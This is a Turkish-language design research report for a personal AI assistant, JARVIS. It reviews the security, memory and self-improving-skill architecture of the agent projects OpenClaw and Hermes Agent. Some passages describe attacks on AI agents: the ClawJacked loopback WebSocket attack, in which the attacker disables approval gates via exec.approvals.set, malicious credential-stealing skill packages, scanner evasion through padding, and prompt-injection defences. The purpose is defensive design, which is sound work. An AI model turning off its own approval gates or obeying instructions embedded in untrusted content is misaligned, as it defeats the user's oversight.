Yetki matrisine "izin var/yok"un üstüne bir **binding katmanı**: onay verildiğinde tam çağrı bağlamına kilitlensin (hedef tool + çözümlenmiş argümanlar + **tek somut operand**: bir dosya, bir kişi ID'si, bir hesap). Firestore'da kalıcı, `son_kullanim` damgalı. Üç mod: `sorma` / `eşleşmezse-sor` / `her-zaman-sor`. İki sert kural aynen alınabilir: (a) dinamik kod/eval formları allowlist'te olsa bile her zaman onay ister; (b) gömülü-içerik formları tırnaklamadan bağımsız her zaman onay ister.
→ **Etki:** "WhatsApp mesajı gönder" onayının "herhangi bir kişiye herhangi bir mesaj" anlamına gelmesini önler.
→ **Yer:** §9 yetki matrisi + Y3 onay merkezi.

**Ç2 — Güvenilmeyen içerik zarfı + tokenizer temizliği + `contextVisibility`.**
Girdi modalitelerimiz (her dosya uzantısı, ekran/kamera paylaşımı, alıntılar, tool sonuçları) tam da bu sarmalayıcının hedef yüzeyi. Üç parça: `<<<EXTERNAL_UNTRUSTED_CONTENT>>>` zarfı + `Source: External` metadata; ChatML/Llama/Gemma/Mistral özel token literallerini strip (model Gemini olsa bile çok-modelli gelecek için ucuz sigorta); ek bağlamın prompt'a girmesini **tetikleme yetkisinden ayrı** bir anahtarla yönetme.
→ **Yer:** ses geçidi + orkestratör girdi hattı.

**Ç3 — `jarvis guvenlik-denetimi` komutu.**
`security audit --deep --fix` karşılığı: yetki matrisi drift'i (kim ne zaman genişletti), Firestore kuralları, Cloud Run IAM + ingress, servis hesabı kapsamı, speaker-ID eşiği, model tier'ı, secret'ların yeri, **fabrikanın ürettiği ajanların efektif tool setleri**. `--json` ile CI'a bağlanır; `--fix` kasten dar (yalnız geri alınabilir sıkılaştırmalar).
→ **Etki:** "K2 canlı+kanıtlı" disiplininin güvenlik ayağı.

**Ç4 — Deklaratif yetenek ön-koşulu (skill gating metadata).**
Fabrikadaki her ajan/skill tanımına `metadata.openclaw` karşılığı: `requires.env`, `requires.config`, `requires.bins`, `os`, `install`. Üretilen ajan **koşum anında değil yükleme anında** elenir — eksik API key'i olan ajan prompt'a hiç girmez. Yanına iki ders: **prompt bütçesi tavanı** (taşınca önce kimlikler korunur, açıklamalar kısaltılır) ve **oturum-başı snapshot + watcher ile kontrollü tazeleme**.
→ **Yer:** §8.5 fabrika + araç kayıt defteri.

**Ç5 — "Dreaming" konsolidasyon cron'u + insan-incelenebilir faz kaydı.**
3-kademe hafıza + ders defteri için: zamanlanmış job günlük notları skorlasın, eşik üstündekileri kalıcı kademeye **bir subagent rewrite'ıyla** terfi ettirsin, duplikat'ları merge edip bayatları supersede etsin, her fazın özetini **ayrı bir insan-inceleme dosyasına** yazsın. Kritik detay: **terfi kararı deterministik ve eşik-kapılı, yazma işlemi LLM'e bırakılıyor.** Ayrıca `compaction.memoryFlush`: **bağlam sıkıştırmadan hemen önce otomatik hafıza kaydetme turu.**
→ **Yer:** §4.5 hafıza + Arşivci ajanı + §8.4 haftalık retro.

**Ç6 (bonus) — İki kapılı node komut modeli.**
Wear OS / Android / PWA: istemci connect metadata'sında yeteneğini deklare etsin **ve** buluttaki platform-türevli allowlist izin versin. Tehlikeli olanlar (kamera, ekran kaydı, SMS, konum) platform izin verse bile açık opt-in istesin. Pending pairing istekleri kısa TTL ile expire olsun (onlarda 5 dk).

### 1.11 KAÇINILACAK anti-pattern'ler

**K1 — Ağ konumunu kimlik sanmak.**
ClawJacked'ın tek cümlelik kök nedeni: *"loopback bağlantıları sessiz auto-approve edilir."* Tarayıcı loopback'e cross-origin WS açabildiği için "yerel = güvenilir" varsayımı ölümcül oldu.
**JARVIS'teki karşılığı:** "istek kendi Cloud Run servisimizden geldi", "aynı VPC", "aynı proje", "bizim imzalı APK'mızdan geldi" — **bunların hiçbiri kimlik değildir.** Her istek kendi kimliğini taşımalı.
**İkinci ders (daha kritik):** **güvenlik politikasını değiştiren API'ler, politikanın koruduğu API'lerle aynı yetki seviyesinde olmamalı.** Saldırgan `exec.approvals.set {ask:"off"}` + `config.patch` çağırabildiği için onay kapısını kendi kendine kapattı. **Bizde yetki matrisini değiştirmek, matrisin kapsadığı herhangi bir eylemden kategorik olarak daha yüksek bir kapıdan geçmeli (ör. speaker-ID + ayrı onay) ve ajanın tool yüzeyinden hiç erişilebilir olmamalı.**

**K2 — İzin modeli olmayan "skill/prompt paketi" pazar yeri.**
Sonuç: %26 sömürülebilir, 341 kötücül skill, 1.184 credential-çalan işaretleme, 22 MB padding ile tarayıcı atlatma. Üçlü ders:
- (a) **dışarıdan gelen talimat metni asla eylem yetkisi taşımamalı** — talimat ve yetki ayrı kanallardan gelmeli
- (b) statik/LLM tabanlı tarama tek başına yetersiz ve kolayca oyunlanıyor; **kapsam sınırlaması (capability scoping) tarayıcının yerini tutan tek şey**
- (c) **dinamik payload** (her çağrıda uzaktan talimat çekmek) = yeniden yayın yapmadan davranış değiştirme → tek başına kırmızı bayrak

Fabrikamız dışarıdan prompt paketi alacaksa: imzalı + provenance'lı + **açıkça deklare edilmiş ve fabrikanın kısıtlayabildiği tool alt kümesiyle** sınırlı. "Ajanın yetkisi = paketin yetkisi" denklemi **asla** kurulmamalı.

**K3 — Yeni kimlik/hesap/ilişki yaratmayı sıradan eylem saymak + observability'yi audit sanmak.**
MoltMatch'te sandbox kaçışı yok, CVE yok, exploit yok. Ajan **kendisine verilmiş yetkiyi** kullanarak kullanıcı adına kimlik yarattı ve o kimlikle sosyal kararlar verdi. Kök neden: "yeni dış kimlik/hesap oluşturma", "kullanıcı adına üçüncü tarafla ilişki kurma", "kullanıcının kimliğini bir platforma yayınlama" **ayrı yetki sınıfları olarak modellenmemişti**.
→ **Bizim matrisimiz bunları "okuma/yazma/gönderme"den ayrı, kendi başına HITL gerektiren bir sınıf olarak tanımlamalı.**

Bağlı ikinci anti-pattern: OpenClaw'da olan biteni sonradan anlamanın yolu OTel span'leri, ve **ham içerik + session id + prompt metni kasten dışarıda**. Yani MoltMatch tipi bir olayda "ajan bunu neden yaptı, hangi politika izin verdi, kim istedi" sorusuna **cevap veremezsin**.
→ **Firestore audit log'umuz metrik değil KARAR KAYDI olmalı:** kim istedi, hangi kimlik doğrulandı, hangi politika kuralı eşleşti, hangi operanda bağlandı, sonuç ne — **append-only, ajanın yazma yetkisi dışında.**

### 1.12 Doğrulama notu

**Birincil kaynaktan doğrulandı** (docs.openclaw.ai + GitHub API + LICENSE): gateway process modeli, port, frame şekilleri, idempotency, state dizin haritası, exit-78, tüm sandbox config anahtarları ve varsayılanları, üç katmanlı model, exec approval mekaniği + SQLite tablosu, DM pairing politikaları + 1 saat TTL, device pairing + **loopback auto-approve varsayılanı** + 5 dk expiry, untrusted content envelope, special-token stripping, SSRF politikası, `.env` bloklama, `security audit` kapsamı, OTel span isimleri **ve içerik dışlaması**, skill frontmatter/gating/öncelik/prompt bütçesi, trust envelope, plugin in-process yüklemesi, MCP client+server, hafıza dosya seti + dreaming + backend'ler, cron SQLite + backoff, kanal listesi ve cihaz bağımlılıkları, node capability listeleri, canlı yıldız/issue/release rakamları, MIT lisansı.

**İkincil kaynaklara dayanan bölümler:** CVE-2026-25253 kod zinciri (depthfirst birincil araştırma — güçlü), Oasis brute-force, Cisco Talos yüzdeleri, ClawHavoc/Snyk kampanyaları, Moltbook sızıntısı, SecurityScorecard sayıları, Çin kısıtlaması, MoltMatch, Foundation tarihçesi, proje sağlığı yüzdeleri.

**Çözülemeyen çelişki:** CVE-2026-25253'ün etkilenen sürüm aralığı üç kaynakta farklı.

**Bulunamayanlar:** RPC metod sayısı; heartbeat aralığı sayısal değeri; `/concepts/voice` ve `/tools/cron` 404 (wake word / push-to-talk detayları eksik); GitHub contributors sayısı (API 403); CVE-2026-25157 teknik kök nedeni; ClawScan tarama mekanizması; skill imzalama şeması.

### 1.13 Kaynaklar

**Birincil — resmî doküman ve repo**
[Docs ana sayfa](https://docs.openclaw.ai/) · [Architecture](https://docs.openclaw.ai/concepts/architecture) · [Gateway](https://docs.openclaw.ai/gateway) · [Security](https://docs.openclaw.ai/gateway/security) · [Sandboxing](https://docs.openclaw.ai/gateway/sandboxing) · [Sandbox vs tool policy vs elevated](https://docs.openclaw.ai/gateway/sandbox-vs-tool-policy-vs-elevated) · [Exec approvals](https://docs.openclaw.ai/tools/exec-approvals) · [Device pairing](https://docs.openclaw.ai/gateway/pairing) · [Remote access](https://docs.openclaw.ai/gateway/remote) · [Tools](https://docs.openclaw.ai/tools) · [Skills](https://docs.openclaw.ai/tools/skills) · [Plugins](https://docs.openclaw.ai/tools/plugin) · [MCP](https://docs.openclaw.ai/tools/mcp) · [Memory](https://docs.openclaw.ai/concepts/memory) · [Automations](https://docs.openclaw.ai/cli/cron) · [OpenTelemetry](https://docs.openclaw.ai/gateway/opentelemetry) · [Channels](https://docs.openclaw.ai/channels) · [Nodes](https://docs.openclaw.ai/nodes) · [ClawHub](https://docs.openclaw.ai/clawhub) · [GitHub repo](https://github.com/openclaw/openclaw) · [Security Advisories](https://github.com/openclaw/openclaw/security/advisories) · [Issue #9245 — kod kalitesi](https://github.com/openclaw/openclaw/issues/9245)

**Güvenlik araştırması**
[depthfirst — 1-Click RCE kod analizi](https://depthfirst.com/post/1-click-rce-to-steal-your-moltbot-data-and-keys) · [Oasis Security — ClawJacked](https://www.oasis.security/blog/openclaw-vulnerability) · [heise — code smuggling](https://www.heise.de/en/news/AI-Bot-OpenClaw-Moltbot-with-high-risk-code-smuggling-vulnerability-11161780.html) · [Unit 42 — ClawHub tedarik zinciri](https://unit42.paloaltonetworks.com/openclaw-ai-supply-chain-risk/) · [Snyk — clawdhub kampanyası](https://snyk.io/articles/clawdhub-malicious-campaign-ai-agent-skills/) · [Tenable — agentic AI risk azaltma](https://www.tenable.com/blog/agentic-ai-security-how-to-mitigate-clawdbot-moltbot-openclaw-vulnerabilities) · [Infosecurity — 40.000+ açık instance](https://www.infosecurity-magazine.com/news/researchers-40000-exposed-openclaw/) · [THN — infostealer](https://thehackernews.com/2026/02/infostealer-steals-openclaw-ai-agent.html) · [Antiy Labs — ClawHavoc](https://www.antiy.net/p/clawhavoc-analysis-of-large-scale-poisoning-campaign-targeting-the-openclaw-skill-market-for-ai-agents/) · [CybersecurityNews — tarayıcı bypass](https://cybersecuritynews.com/clawhub-cisco-vercels-malicious-skill-detector-bypassed/) · [OX Security — MoltBot analizi](https://www.ox.security/blog/one-step-away-from-a-massive-data-breach-what-we-found-inside-moltbot/)

**Yönetişim / olaylar / proje sağlığı**
[Wikipedia — OpenClaw](https://en.wikipedia.org/wiki/OpenClaw) · [Computerworld — nonprofit foundation](https://www.computerworld.com/article/4196365/openclaw-becomes-a-nonprofit-foundation-as-it-seeks-to-be-the-switzerland-of-ai.html) · [explainX — 501(c)(3)](https://explainx.ai/blog/openclaw-foundation-501c3-nonprofit-july-2026) · [Tom's Hardware — Çin kısıtlaması](https://www.tomshardware.com/tech-industry/artificial-intelligence/china-bans-openclaw-from-government-computers-and-issues-security-guidelines-amid-adoption-frenzy) · [TechSpot — "vibe coding" tartışması](https://www.techspot.com/news/111468-openclaw-creator-vibe-coding-slur-against-ai-assisted.html)

---

## 2. Hermes Agent

**Kimlik:** [`NousResearch/hermes-agent`](https://github.com/NousResearch/hermes-agent) · MIT · **225.509 yıldız / 43.808 fork** (5 Ağu 2026) · son commit bugün (2026-08-05T00:23Z, Teknium) · Python 3.11 (+ TS/Ink TUI, Electron desktop) · son release `v2026.8.3` = "Hermes Agent v0.20.0" · ~600 MB checkout.

**Tez:** JARVIS'in "ince istemci + bulut beyin" bahsinin **tersini** oynayan, tek kullanıcılık **her zaman açık daemon** — ama "deneyimden skill üretme + üretileni bakım altında tutma" döngüsünü **bizim ajan fabrikamızdan çok daha ileri** götürmüş.

### 2.1 Mimari

Tek `AIAgent` sınıfı (`run_agent.py`, **8.159 satır / 374 KB**) altı giriş noktasına birden hizmet ediyor: CLI, gateway, ACP adapter (VS Code/Zed/JetBrains), batch runner, API server, Python kütüphanesi. "Platform-agnostic core" ilkesi yazılı: platform farkları giriş noktasında yaşar, ajanda değil.

| Katman | Gerçek |
|---|---|
| Tool registry | import-time self-registration; **70+ tool / ~28 toolset** |
| Provider | 18+ sağlayıcı, 3 wire protokolü, 300+ model |
| State | Tek `~/.hermes/state.db` SQLite (WAL) — sessions, messages, **3 ayrı FTS5 tablosu** (standart + trigram + CJK), `compression_locks`, `async_delegations` |
| Gateway | **Uzun ömürlü tek proses**, `~/.hermes/gateway.pid`. 22 bundled platform plugin'i + 9 doğrudan adapter |
| Terminal backend | **7 adet:** `local, docker, ssh, singularity, modal, daytona, vercel_sandbox` |
| Plugin | 3 keşif kaynağı. İki özel tip: **memory provider** ve **context engine** — ikisi de single-select |
| Subagent | `delegate_task` — izole context, `max_concurrent_children: 3`, `max_spawn_depth: 1` (varsayılan flat) |

**Profil izolasyonu:** her profil kendi `HERMES_HOME`, config, memory, session ve gateway PID'ini alır; eşzamanlı çalışırlar.

> ⚠️ **Dev-ergonomi uyarısı:** `cli.py` **859 KB**, `hermes_state.py` 428 KB, `mcp_tool.py` 316 KB, `approval.py` 195 KB. Tek dosyalar. Bu ölçek review ve statik analiz için düşman.

### 2.2 Hafıza — üç kademe, bizimkiyle şaşırtıcı paralel ama farklı yerlere düşüyor

**Kademe 1 — bağlanmış, ajan-küratörlü metin:**
`~/.hermes/memories/MEMORY.md` (**2.200 karakter**, ~800 token) + `USER.md` (**1.375 karakter**, ~500 token). Sistem promptuna **oturum başında donmuş snapshot** olarak enjekte (prefix cache'i korumak için kasıtlı). Ajan `memory` tool'uyla `add/replace/remove` yapar — **`read` action'ı YOKTUR**, çünkü içerik zaten promptta. Limit aşımında **otomatik sıkıştırma yok**: tool hata döner, mevcut entry listesini geri verir, ajandan **aynı turda konsolide etmesini** ister. Yazmadan önce duplicate reddi + **enjeksiyon/exfiltration threat taraması** (görünmez Unicode dahil bloklanır).

**Kademe 2 — sınırsız arama:**
Tüm oturumlar `state.db`'de. `session_search` FTS5 üzerinden **~20 ms'de gerçek mesajları** döner — **LLM özeti yok, truncation yok**; ajan bulduğu oturumda ileri/geri kaydırabilir. Oturum soyağacı `parent_session_id` zinciriyle izlenir. Docs'un kendi tablosu: memory = sabit ~1.300 token/oturum maliyeti, session_search = talep üzerine, **LLM çağrısı yok**.

**Kademe 3 — harici memory provider plugin'leri:** `honcho, openviking, mem0, hindsight, holographic, retaindb, byterover, supermemory` — 8 adet, **aynı anda yalnız biri aktif**, varsayılan boş.

**"Holographic memory" gerçekte ne:** Bu bir *plugin*, varsayılan değil. Şema:
```sql
facts(fact_id, content UNIQUE, category, tags, trust_score REAL DEFAULT 0.5,
      retrieval_count, helpful_count, created_at, updated_at, hrr_vector BLOB)
entities(entity_id, name, entity_type, aliases)
fact_entities(fact_id, entity_id)
facts_fts USING fts5(content, tags, content=facts, content_rowid=fact_id)
memory_banks(bank_name, vector BLOB, dim, fact_count)
```
Retrieval **hibrit ve deterministik, embedding servisi yok**: FTS5 ile `limit*3` aday → Jaccard token-overlap rerank → `final_score = relevance × trust_score` → opsiyonel temporal decay `0.5^(age_days/half_life)`. Ağırlıklar `fts 0.4 / jaccard 0.3 / hrr 0.3`; **numpy yoksa otomatik `0.6/0.4/0`'a düşer** — yani "holographic" kısım opsiyonel bir bileşen. Entity çıkarımı **regex** ile. `fact_feedback` tool'u trust'ı eğitir: helpful `+0.05`, unhelpful `−0.10`.

> **Not:** "semantic/working/episodic" katman şeması **repoda YOK** — bu terminoloji ikincil kaynakların yakıştırması. Gerçek ayrım: *bounded curated prompt memory / unbounded FTS5 session search / pluggable external provider*.

### 2.3 Self-improving skills — raporun en değerli mekanizması

**Bu, bizim §8.5 "ajan fabrikası + araç kazanım merdiveni" fikrinin çalışan karşılığı ve tahmin edilenden çok daha olgun.**

**1) Tetikleyici: post-turn background review fork.** Her turdan sonra `AIAgent._spawn_background_review()` → **daemon thread içinde ikinci bir `AIAgent` fork'u**, kendi prompt cache'iyle, aktif konuşmaya hiç dokunmadan konuşmayı replay eder. Üç prompt: `_MEMORY_REVIEW_PROMPT`, `_SKILL_REVIEW_PROMPT`, `_COMBINED_REVIEW_PROMPT`.

**2) Skill review promptu agresif şekilde "eylem" yanlı.** Birebir:
> *"Be ACTIVE — most sessions produce at least one skill update, even if small. A pass that does nothing is a missed learning opportunity, not a neutral outcome."*

Hedef kütüphane şekli dayatılıyor: **class-level umbrella skill'ler**, her biri zengin `SKILL.md` + `references/` dizini. "Uzun düz bir dar-skill listesi" istenmiyor. Tercih sırası zorunlu:
1. Bu oturumda **yüklenmiş** skill'i patch'le
2. Mevcut umbrella'yı patch'le
3. Umbrella altına destek dosyası ekle — `references/<topic>.md`, `templates/<name>`, `scripts/<name>`
4. **Ancak hiçbiri uymuyorsa** yeni umbrella yarat — adı PR numarası, hata metni veya "fix-X/debug-Y-today" **olamaz**

**Kullanıcı tercihi gömme kuralı:** kullanıcı stil/format düzeltmesi yaptıysa bu **memory'ye değil, o iş sınıfını yöneten SKILL.md gövdesine** yazılır. Ayrım net:
> *"Memory captures who the user is; skills capture how to do this class of task for this user."*

**3) NEGATİF LİSTE — asıl çalınacak şey.** Prompt **ne öğrenilmeyeceğini** de yazılı kurala bağlıyor:
- Ortam bağımlı hatalar (eksik binary, yapılandırılmamış credential, "command not found")
- **Araçlar hakkında olumsuz iddialar** ("browser tools çalışmıyor", "X bozuk") — birebir gerekçe: *"These harden into refusals the agent cites against itself for months after the actual problem was fixed."*
- Oturum sonunda çözülmüş geçici hatalar (ders **retry pattern'ıdır**, hatanın kendisi değil)
- Tek seferlik görev anlatıları
- **Çözülememiş başarısızlıklar** — birkaç şey denenip hiçbiri işe yaramadıysa o denemeleri "güvenilir iş akışı" diye yazmak yasak; gelecekteki oturum test edilmemiş bir başarısızlık dizisine güvenip tekrarlar

**4) Provenance — kim yazdı takibi (`tools/skill_provenance.py`).** Bir `ContextVar` ile write-origin: `"foreground"` vs `"background_review"`. **Yalnızca background-review fork'unun yarattığı skill'ler `agent-created` işaretlenir** ve küratör yönetimine girer. Kullanıcının ön planda yazdırdığı skill kullanıcınındır, otomatik bakıma **asla** girmez. Korumalı sınıflar: bundled, hub-installed, external dirs, **pinned**, user-owned. Prompt ajana da söylüyor: *"You are an autonomous no-user-present actor, so pin blocks your writes too."*

**5) Onay kapısı — varsayılan KAPALI (kritik nüans):**
```yaml
memory: { write_approval: false }   # varsayılan: serbest yaz
skills: { write_approval: false }
```
`true` yapılırsa: memory yazımları CLI'da **inline** sorulur (küçükler, baloncukta okunur); **background review yazımları her yerde stage edilir** (daemon thread prompt'ta bloklanamaz). Skill yazımları **kaynağı ne olursa olsun her zaman stage edilir**, çünkü bir `SKILL.md` sohbet baloncuğunda okunamaz. Kuyruk `~/.hermes/pending/skills/<id>.json` altında **restart'a dayanıklı**.
→ **Yani: inline onay küçük yazımlar için, gist + out-of-band diff büyük yazımlar için. İki farklı UX, bilinçli ayrım.**

**6) Küratör — üretilenin çöp toplayıcısı.** Cron daemon değil, **inaktivite kontrolü**: `interval_hours: 168` (7 gün) geçtiyse **ve** `min_idle_hours: 2` boştaysa bir `AIAgent` fork'u başlar.
- **Faz 1 — deterministik, LLM yok, hep açık:** kullanılmayan skill `active → stale (30 gün) → archived (90 gün)`. **ASLA SİLMEZ** — `.archive/`'a taşır, geri alınabilir. Pinned skill'ler ve **herhangi bir cron job'ın referans verdiği** skill'ler (duraklatılmış job'lar dahil) tamamen muaf. `use_count == 0` olanlara grace floor: *"Zero uses is absence of evidence, not proof the skill is disposable."*
- **Faz 2 — LLM konsolidasyonu, VARSAYILAN KAPALI:** açılırsa 50–100 API çağrısı; örtüşen skill'leri umbrella'lara birleştirir, `references/templates/scripts` paketini **bütün olarak** taşır.
- İlk kurulumda hemen çalışmaz; `curator run --dry-run` ile önizleme var.

**7) Kullanıcıya görünür öğrenme yüzeyi — `/journey`.** Öğrenilen skill + memory düğümlerinin zaman çizelgesi (CLI, TUI overlay, desktop "Star Map"). Sadece görüntüleme değil: `list / delete <node> / edit <node>` — skill silme **arşivleme** (geri alınabilir), memory chunk silme gerçek silme.

**8) Maliyet kontrolü.** `auxiliary.background_review` **ayrı bir model slotu**. Varsayılan `auto` = ana model (prompt cache sıcak, ucuz cache read). Farklı modele yönlendirilirse **otomatik olarak digest replay'e geçer**: son turlar verbatim + öncekilerin özeti — çünkü farklı model zaten cache'i kullanamaz. Docs iddiası: **~3–5× daha ucuz, memory yakalama birebir aynı**. Aynı slot mimarisi `curator`, `memory_query_rewrite`, vision, compression, session search için de var.

**Skill tedarik zinciri:** Skills Hub 8 kaynak; trust seviyeleri `builtin / official / trusted / community`; her kurulumda güvenlik taraması (`skills_guard.py`, 47 KB); `--force` caution/warn'ı geçer ama **`dangerous` verdict'ini geçemez**; `skills audit --deep` AST taraması dosyanın kendi docstring'inde *"opt-in diagnostic, not a security gate"* diye etiketli.

### 2.4 Dağıtım — "cloud-first" iddiası yanıltıcı

| İddia | Gerçek |
|---|---|
| "Not tied to your laptop" | ✅ **Doğru.** Beyin bir VPS/container'da koşar, Telegram'dan konuşursun |
| "Serverless, idle'da ~sıfır maliyet" | ⚠️ **Yanıltıcı.** Hibernate olan şey **terminal backend**'dir (Modal/Daytona/Vercel Sandbox) — ajanın kendisi değil |
| Ajan prosesi | ❌ **Always-on daemon.** `gateway/run.py` uzun ömürlü Python prosesi. **Scale-to-zero yok, cold start kavramı yok** |
| State | Tek host'un dosya sisteminde. **Managed veritabanı yok** |

> **JARVIS için kritik sonuç:** Hermes'in modeli **connection-driven**, event-driven değil — 25+ platforma kalıcı bağlantı tutan bir gateway prosesi olmadan mesaj alamaz. Bizim Pub/Sub + Gmail push + Calendar watch mimarimiz bu bağlantıyı bulut tarafına devrettiği için scale-to-zero'yu mümkün kılıyor. **Bu, Hermes karşısındaki en net mimari üstünlüğümüz.**

### 2.5 Güvenlik — çok dürüst bir SECURITY.md

**Temel doktrin, birebir:**
> *"The only security boundary against an adversarial LLM is the operating system. Nothing inside the agent process constitutes containment — not the approval gate, not output redaction, not any pattern scanner, not any tool allowlist."*

**İki izolasyon duruşu:**
- **Terminal-backend izolasyonu:** shell + dosya tool'larını hapseder. **Hapsetmediği:** `execute_code` (host subprocess), MCP subprocess'leri, plugin yükleme, hook dispatch, skill yükleme
- **Whole-process wrapping:** Docker imajı veya **NVIDIA OpenShell** (oturum başına sandbox, filesystem/network-L7-egress/syscall politikaları, credential'lar sandbox dosya sistemine hiç değmez). Güvenilmeyen içerik yutan kurulumlar için **desteklenen tek duruş** budur

**Dış yüzey kuralları (§2.6) — bizim için en önemli kısım:**
1. Trust sınırını geçen her yüzeyde yetkilendirme zorunlu
2. Allowlist yoksa adapter iş dağıtmayı **reddetmek zorunda**; fail-open kod yolu **bug**'dır
3. Session ID'ler **routing handle**'dır, yetki sınırı değil
4. > **"Within the authorized set, all callers are equally trusted. Hermes Agent does not model per-caller capabilities inside a single adapter."** — Yani **yetki matrisi yok.** Kapasite ayrımı isteyen ayrı instance çalıştırmalı.

**Audit yüzeyi:** yalnız skill install audit log + Skills Guard raporları. **Eyleme yayılmış yapılandırılmış audit log yok.**

### 2.6 Olgunluk ve zayıflıklar

- **9.098 açık issue, 18.831 açık PR** (toplam 27.924). **19 bine yaklaşan birleşmemiş PR yığını projenin en çarpıcı sağlık sinyali** — katkı hacmi triage kapasitesini fena halde aşmış.
- Etiket dağılımı: `comp/gateway` 1.656, `comp/plugins` 898, `area/install-update` 561, **`needs-repro` 537**, `area/memory` 422. `P0` 1, `P1` 17.
- Tekrarlayan bug temaları: desktop app olgunlaşmamış, sağlayıcıya özgü kırılganlık (DeepSeek V4 Flash sonsuz reasoning döngüsü), gateway/container reconciliation, Windows service altında CLI'ın **684 saniye** açılması.
- **Holographic provider'ın kendi zaafı (issue #77919):** *"Holographic prefetch ignores entity bindings — FTS5-only recall misses facts when query uses different wording"* — HRR/entity yatırımının pratikte kısmen atlandığı bir kabul.
- **Tek-yazıcı SQLite** çok-tüketicili mimarinin altında: `compression_locks`, WAL, paylaşılan bağlantı kaydı — hep aynı yaranın yamaları.
- **Onay kapıları varsayılan kapalı.** Kutudan çıkan Hermes arka planda onaysız olarak hafızana ve skill kütüphanene yazar. Docs bunun kullanıcı şikayeti kaynaklı olduğunu itiraf ediyor.

### 2.7 Ses / konuşmacı kimliği

**Ses: kapsamlı. Konuşmacı kimliği: YOK — doğrulandı.**

Var: `faster-whisper==1.2.1` (yerel), Groq, OpenAI STT · **wake word:** `openwakeword==0.6.0` (ONNX varsayılan), **sherpa-onnx (açık sözcük dağarcığı — herhangi bir yazılı ifade, eğitim gerektirmez)**, `pvporcupine==4.0.3` · **TTS:** Edge TTS, NeuTTS (yerel, anahtarsız), ElevenLabs, OpenAI, MiniMax, Gemini · **barge-in:** gürültü tabanı **oturum başındaki sessiz odaya** göre kalibre edilir, playback'e göre değil · halüsinasyon filtresi, sesle oturum bitirme.

**Yok (arandı):** speaker verification, voiceprint, ECAPA/speechbrain/pyannote/resemblyzer bağımlılığı, diarization, sesle yetkilendirme. Yetkilendirme tamamen **statik allowlist + DM pairing**.

> **Bu bizim en net teknik üstünlüğümüz.** Hermes'in ses yığını daha geniş; bizim ses *kimliği* mimarimiz Hermes'te hiç yok.

### 2.8 ÇALINACAK fikirler

**H1 — Tur-sonrası "ders defteri" fork'u + yazılı negatif liste.**
→ *Yer:* Orkestratöre, her turdan sonra tetiklenen ayrı bir statik uzman (Arşivci'nin bir modu veya yeni bir "Denetçi"). Ana konuşmanın context'ine dokunmaz.
→ *Neden:* "Her etkileşimden öğrenir" ilkemiz şu an ana akışın içinde. Ayrı fork'a taşımak (a) prompt cache'i bozmaz, (b) öğrenmeyi eylemden ayırır. **Asıl kazanç negatif liste:** özellikle *"araç bozuk"* tarzı olumsuz iddiaların kalıcı ders olarak yazılması tuzağı, **İlke 4 (hatalar exception değil GÖZLEM) ile doğrudan çarpışıyor** — model bir gözlemi kalıcı bir kısıta dönüştürürse aylarca kendi kendini reddeder. Baştan yazmak sonradan temizlemekten çok ucuz.

**H2 — Write-origin provenance + yaşam döngüsü küratörü (K3'ün ön koşulu).**
→ *Yer:* Fabrika K2/K3 ve araç kazanım merdiveni. Her üretilen ajan/araç/tarif Firestore'da `origin: user_approved | autonomous` + `use_count` + `last_used_at` ile doğsun. Yalnız `autonomous` olanlar otomatik bakıma girsin.
→ *Neden:* **K3'ü açmanın yolu daha fazla ön-onay değil, geri alınabilir bir çöp toplama katmanı.** Formül hazır: `active → stale (30g) → archived (90g)`, **asla silme**, zamanlanmış işe bağlı olanlar muaf, hiç kullanılmamışlara grace floor. Bu katman olmadan K3 kaçınılmaz olarak birbirinin kopyası dar ajanlarla dolar.

**H3 — İki hızlı onay yüzeyi: inline gist vs out-of-band diff.**
→ *Yer:* Politika katmanı + Android/Wear istemcileri.
→ *Neden:* Çok-yüzeyli istemci problemimize birebir denk düşüyor: **küçük yazımlar (hafıza girdisi) telefonda/saatte tam metin onaylanır; büyük yazımlar (yeni ajan tanımı, yeni araç) tek satırlık gist + metadata ile onaylanır, tam diff PWA'ya bırakılır.** Wear OS'ta bir ajan tanımını okutmaya çalışmak baştan kaybedilmiş bir savaş.

**H4 — Görev başına auxiliary model slotu + digest replay.**
→ *Yer:* ADK orkestratörünün model çözümleme katmanı; `auxiliary.{ders_defteri, kurator, sikistirma, gorsel, oturum_arama}` slotları, her biri `auto` veya açık `provider:model`.
→ *Neden:* Bulut-öncelikli olduğumuz için token maliyeti doğrudan Cloud Run faturası. Ölçülmüş bulgu: yan görevi ucuz modele taşımak **~3–5× tasarruf** sağlıyor ve yakalama kalitesi korunuyor. **Kritik incelik:** farklı modele giderken tam transkript göndermek anlamsız (cache zaten kullanılamaz) — onun yerine "son N tur verbatim + öncesi özet" digest gönder. Uygulaması bir günlük, getirisi kalıcı.

**H5 — MCP misafir kapısı için hazır tool yüzeyi, özellikle `permissions_respond`.**
→ *Yer:* Mevcut misafir kapısı bileşeni.
→ *Neden:* `hermes mcp serve` 10 tool'luk somut bir sözleşme sunuyor: `conversations_list, conversation_get, messages_read, attachments_fetch, events_poll, events_wait, messages_send, permissions_list_open, permissions_respond, channels_list`. **Asıl fikir son ikisi — dış bir AI'ın bekleyen onay kuyruğunu listeleyip cevaplayabilmesi.** Bu, agent-mesh hedefimizle birebir örtüşüyor ve yetki matrisiyle birleştiğinde Hermes'in yapamadığını yapar: misafir AI'a **hangi** onayları çözebileceğini kısıtlamak. Hermes'te imkânsız (allowlist içindeki herkes eşit); bizde policy layer zaten var. **Yani çalınacak yüzeyin bizde Hermes'ten daha iyi çalışacağı bir yer.**

### 2.9 Doğrulama notu

Repoda doğrudan okundu: `README.md`, `SECURITY.md`, GitHub REST API metrikleri, dizin listeleri, `plugins/memory/holographic/{store,retrieval}.py`, `tools/skill_provenance.py`, `agent/background_review.py` (`_SKILL_REVIEW_PROMPT` tamamı), `hermes_cli/config_defaults.py`, `pyproject.toml`, `mcp_serve.py`, `website/docs/*` (architecture, session-storage, memory, memory-providers, skills, curator, voice-mode, wake-word, docker).

İddia (doğrulanmadı): 25 Şubat 2026 lansman tarihi (repo `created_at` = **2025-07-22**, çelişiyor); CVE-2026-7113 (webhook auth); v0.13.0'ın 8 P0 güvenlik düzeltmesi; "10 haftada 110k yıldız"; OpenRouter sıralaması iddiası.

Arandı, bulunamadı (yokluk doğrulandı): speaker identification / voiceprint / diarization; "semantic/working/episodic" katman şeması; eyleme yayılmış yapılandırılmış audit log; ayrı bir deployment/hosting dokümanı.

---

## 3. Diğer kişisel asistan projeleri

> Tüm rakamlar GitHub REST API'den **5 Ağustos 2026**'da doğrudan çekildi. Aktiflik `commits?since=2026-07-06` ile ölçüldü.

